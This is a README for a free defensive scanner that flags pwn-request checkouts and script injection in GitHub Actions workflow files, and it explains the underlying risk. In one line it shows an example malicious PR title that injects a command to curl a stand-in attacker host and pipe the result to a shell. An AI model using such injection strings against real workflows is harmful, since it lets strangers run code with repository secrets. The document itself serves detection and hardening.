# Actions Injection Check

A free tool that scans GitHub Actions workflow YAML for the two documented
ways attacker-supplied input reaches privileged execution:

1. **Pwn-request checkout** — a `pull_request_target` or `workflow_run`
   workflow (which runs with the *base* repo's secrets and a privileged
   token) that checks out the fork's head, e.g.
   `ref: ${{ github.event.pull_request.head.sha }}`.
2. **Script injection** — a `run:` step that interpolates an untrusted
   `${{ github.event.* }}` or `${{ github.head_ref }}` expression directly
   into a shell command, where the value is spliced into the script text
   before the shell ever sees it as data.

Both are described in GitHub's own "Security hardening for GitHub Actions"
guidance. This tool finds them in your files; it does not invent a new
threat model.

**What it is not:** a security audit, a compliance attestation, or a claim
that a clean scan means your workflows are safe. It checks two specific
patterns, and both have variants it does not attempt to catch — a hand-rolled
`git fetch`/`git checkout` instead of `actions/checkout`, or an expression
assembled in an unusual way.

## Why this exists

`pull_request_target` exists so a workflow can comment on, label, or
otherwise act on a pull request from a fork — which needs write permission
the fork must not have. The trap is that the workflow *body* still runs from
the base branch with those permissions, so any step that then builds, tests,
or otherwise executes the fork's checked-out code hands a stranger the
repository's secrets. `actions/checkout` v7 (June 2026) began refusing the
common form by default, which turns "is this me?" into a concrete question a
maintainer now has to answer across every workflow file they own.

Script injection is the sibling failure and is *not* limited to those two
triggers: a PR title, an issue body, or a branch name is content a stranger
fully controls, so `run: echo "${{ github.event.pull_request.title }}"` will
execute a title of `"; curl evil.example | sh #` as a second command. The fix
GitHub names — pass the value through a step `env:` var and reference it as a
quoted shell variable — is what every finding here prints.

## Try it without installing anything

[`index.html`](index.html) runs the same classification logic as a browser
page. Paste one or more files from `.github/workflows/` and get every
finding with its line, the expression involved, and the remediation.

Nothing is uploaded and the page makes no network requests of its own —
there is no server to send anything to.

## Quickstart (CLI)

```sh
python3 check.py                  # scan .github/workflows under the current directory
python3 check.py /path/to/repo    # scan a specific checkout
python3 check.py --format json    # machine-readable
python3 check.py --fail-on-risk   # exit 2 if any finding exists
```

Zero dependencies — stdlib only, one file, nothing to install, no network
calls. Wire `--fail-on-risk` into your own CI to block a newly-added
pwn-request checkout or interpolated `github.event` expression before it
merges.

## Background reading

[`what-is-a-pwn-request-in-github-actions.html`](what-is-a-pwn-request-in-github-actions.html)
explains the pattern, why `pull_request_target` exists at all, and what the
safe alternative (do the untrusted work in an unprivileged `pull_request`
workflow, hand off results via artifacts) looks like.

## Disclaimers

This tool answers two narrow questions about workflow text. It does **not**
assess your repository's overall security posture, and a clean scan is not a
security or compliance claim. Verify its output before relying on it, the
same as any free, best-effort tool.

Optional [GitHub Sponsors](https://github.com/sponsors/Duncan-Haywood)
never changes what this tool does.

## Privacy-conscious usage tracking

The browser page counts anonymous feature events (`check_run`,
`example_loaded`) in `localStorage` only — never transmitted, never tied to a
repository, a workflow, or a token. Do Not Track and Global Privacy Control
are honoured, and a button on the page turns it off entirely. The CLI records
nothing.

## Development

```sh
python3 -m unittest test_check -v
node --test classify.test.mjs page.test.mjs
```

`classify.test.mjs` includes a parity test that shells out to `python3
check.py` and asserts the browser port produces identical findings on the
same fixture, so the CLI and the page can never silently disagree about what
a line means.

## Status

`stage: prototype` in [`VENTURE.yaml`](VENTURE.yaml). Not a scored pipeline
candidate — like [`pinned-actions-check`](../pinned-actions-check/) and
[`actions-runner-starvation-check`](../actions-runner-starvation-check/),
this is a direct graduation of an already-obvious, low-risk dev-tool idea.
No external user contact has happened yet — that is the next, non-code step
(see `kill_criteria` in `VENTURE.yaml`).
